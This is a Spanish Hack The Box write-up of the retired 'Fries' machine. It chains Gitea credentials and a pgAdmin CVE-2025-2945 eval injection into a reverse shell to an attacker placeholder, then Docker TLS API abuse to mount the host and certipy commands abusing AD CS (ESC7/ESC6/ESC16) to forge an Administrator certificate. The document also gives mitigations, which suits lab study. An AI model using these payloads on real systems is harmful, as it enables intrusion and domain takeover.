---
machine: Fries
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, gitea, pgadmin, docker, adcs, esc7, esc6]
---

# Fries — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La caja empieza con credenciales de asunción de brecha. Gitea entrega acceso a PostgreSQL y pgAdmin; pgAdmin 9.1 es vulnerable a CVE-2025-2945 y da shell en un contenedor. Variables de entorno y la base permiten spray y entrada en la host Docker/Hyper-V. Se recrea un usuario de dominio para leer los certificados del daemon, se forja un cliente TLS y se monta el filesystem de la host. Ya como root, PWM guarda la contraseña de una cuenta de servicio, que lee una GMSA y encadena ESC7, ESC6 y ESC16 hasta Administrator.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,80,88,139,389,443,445,5985 <IP>
```

- El DC de `fries.htb` expone también servicios Linux detrás de vhosts.
- `ffuf` encuentra `gitea.fries.htb`, `pgadmin.fries.htb` y `pwm.fries.htb`.
- El enunciado entrega un usuario y una contraseña iniciales.

## Enumeración

- Gitea contiene un repositorio con credenciales de PostgreSQL y pgAdmin.
- pgAdmin 9.1 es vulnerable a CVE-2025-2945: `query_commited` y `high_availability` llegan a `eval()` en Python.
- La base de pgAdmin guarda la contraseña de PostgreSQL en una variable de entorno.

```bash
feroxbuster -u http://gitea.fries.htb
git clone http://<USER>:<PASSWORD>@gitea.fries.htb/<ORG>/<REPO>.git
```

## Foothold

Se explota el endpoint `/sqleditor/query_tool/download` con `query_commited` para ejecutar Python y obtener una shell como `pgadmin` en el contenedor.

```text
POST /sqleditor/query_tool/download HTTP/1.1
query_commited=__import__('os').system('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"')
```

## Movimiento lateral

Con las variables `PGADMIN_DEFAULT_*` y la contraseña de PostgreSQL se hace spray contra los servicios internos. Un usuario `svc` concede acceso a la host Docker, que es una VM Hyper-V. El share NFS permite recrear un usuario de dominio en local y leer `/root/.docker`; con la CA y un cliente TLS forjado se usa la API de Docker para montar `/` de la host.

```bash
openssl req -new -key client.key -out client.csr
docker -H tcp://<HOST>:2376 --tlsverify --tlscacert ca.pem --tlscert client.pem --tlskey client.key run -v /:/mnt -it alpine chroot /mnt /bin/bash
```

## Escalada de privilegios

Como root de la host se lee la configuración de PWM y se descifra la contraseña de `svc_infra`. Esa cuenta puede leer la GMSA y tiene `ManageCA`/`ManageCertificates`. Se encadenan ESC7 (añadir oficial), ESC6 (habilitar SAN en la CA) y ESC16 (deshabilitar la extensión de seguridad) para emitir un certificado de Administrator.

```bash
certipy-ad find -u svc_infra@fries.htb -p '<PASSWORD>' -dc-ip <DC> -vulnerable
certipy-ad ca -u svc_infra@fries.htb -p '<PASSWORD>' -ca fries-DC01-CA -add-officer svc_infra
certipy-ad req -u svc_infra@fries.htb -p '<PASSWORD>' -ca fries-DC01-CA -template User -upn administrator@fries.htb -sid S-1-5-21-...-500
certipy-ad auth -pfx administrator.pfx -dc-ip <DC>
```

## Evidencia

- Credenciales iniciales y Gitea.
- pgAdmin 9.1 y CVE-2025-2945.
- Contenedor, variables y spray a la host Docker.
- Certificados TLS del daemon y montaje de `/`.
- PWM, GMSA y cadena ESC7/ESC6/ESC16.

## Lecciones aprendidas

- Un pgAdmin antiguo es ejecución de código si se alcanza su panel.
- Las credenciales de contenedores y bases se reutilizan en la host.
- Los certificados del daemon Docker son una llave maestra si se leen.
- Varias misconfiguraciones AD CS pueden encadenarse aunque una sola no baste.

## Mitigación y detección

- Actualizar pgAdmin y aislar su panel de la red de administración.
- No reutilizar credenciales entre contenedores, bases y hosts.
- Proteger `/root/.docker`, la CA y el socket/API de Docker.
- Auditar `ManageCA`, `ManageCertificates`, ESC6 y plantillas sin extensión de seguridad.

## Referencias

- [0xdf — Fries](https://0xdf.gitlab.io/2026/07/25/htb-fries.html)
- [IppSec — Fries](https://www.youtube.com/watch?v=GZf2Dj6pb0I)
- [Hack The Box — Fries](https://app.hackthebox.com/machines/fries)
